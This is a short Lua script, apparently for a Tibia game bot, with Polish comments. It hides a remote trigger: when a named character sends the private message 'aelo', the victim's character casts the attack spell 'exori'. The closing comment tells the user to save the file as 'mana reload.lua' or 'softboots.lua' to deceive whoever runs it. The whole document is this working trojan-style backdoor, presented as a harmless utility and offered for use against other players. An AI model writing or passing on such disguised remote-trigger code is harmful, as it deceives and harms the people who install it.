local disableMsg = "aelo" -- wiadomosc po ktorej otrzymaniu osoba maja ten skrypt zacznie walic
local allowedSenders = 
{
	"Gucci Postrach Asylum" --- tutaj umiesc liste postaci oddzielona przecinkami "nick", "nick" 
}

PrivateMessageProxy.OnReceive("Private Message Proxy", function(proxy, speaker, level, text)
    if text == disableMsg and (not allowedSenders or table.find(allowedSenders, speaker)) then
        Self.Say("exori") -- czar
    end
end) 

-- zapisac jako mana reload.lua albo softboots.lua dla sciemy